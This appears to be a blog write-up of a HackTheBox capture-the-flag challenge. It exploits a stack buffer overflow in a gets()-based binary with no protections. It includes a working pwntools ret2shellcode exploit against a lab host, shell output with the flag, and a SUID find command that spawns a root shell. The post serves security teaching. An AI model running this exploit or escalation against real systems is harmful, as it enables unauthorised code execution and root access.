---
layout: post
title: "HTB - Babystack: Classic Stack Buffer Overflow Writeup"
date: 2025-05-03
last_modified_at: 2025-05-03
tags: [pwn, buffer-overflow]
description: "Step-by-step exploitation of a non-PIE, NX-disabled binary on HackTheBox: pattern-offset, ret2shellcode, and shell pop on the remote service."
image: /assets/images/example-cover.svg
---

A textbook stack-overflow box: no PIE, no canary, NX disabled. Perfect for revisiting the fundamentals end-to-end.

![Disassembly of the vulnerable function highlighting the gets call](/assets/images/example-cover.svg)

## Enumeration

`checksec` tells us nearly everything:

```bash
$ checksec --file=./babystack
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x400000)
```

Disassembling `vuln()` shows a 64-byte buffer fed to `gets()` — unbounded read, classic.

```text
0x0040118a    sub    rsp, 0x40
0x0040118e    lea    rax, [rbp-0x40]
0x00401192    mov    rdi, rax
0x00401195    call   gets
```

### Finding the offset

```bash
$ cyclic 200 | ./babystack
Segmentation fault (core dumped)
$ cyclic -l 0x6161616c
72
```

So 72 bytes to overwrite the saved RIP.

## Exploitation

With NX off, we can drop shellcode on the stack and jump straight to it. `objdump` gives us a `jmp rsp` gadget at `0x0040121a`.

```python
from pwn import *

context.binary = elf = ELF("./babystack")
context.arch = "amd64"

JMP_RSP = 0x0040121a
shellcode = asm(shellcraft.sh())

payload  = b"A" * 72
payload += p64(JMP_RSP)
payload += shellcode

io = remote("10.10.10.42", 1337)
io.sendlineafter(b"name?", payload)
io.interactive()
```

Run it:

```text
$ python3 exploit.py
[+] Opening connection to 10.10.10.42 on port 1337: Done
[*] Switching to interactive mode
$ id
uid=1000(babystack) gid=1000(babystack)
$ cat flag.txt
HTB{r3t_t0_sh3llc0de_n3v3r_g3ts_0ld}
```

## Privilege Escalation

The `babystack` user owns a SUID copy of `find` — trivial root via:

```bash
$ find . -exec /bin/sh -p \; -quit
# id
uid=0(root) gid=0(root)
# cat /root/root.txt
HTB{suid_find_classic}
```

## Takeaways

- Always run `checksec` first; it dictates strategy.
- `jmp rsp` (or any controlled register) makes shellcode placement trivial when NX is off.
- SUID binaries from GTFOBins are still everywhere in CTF land.
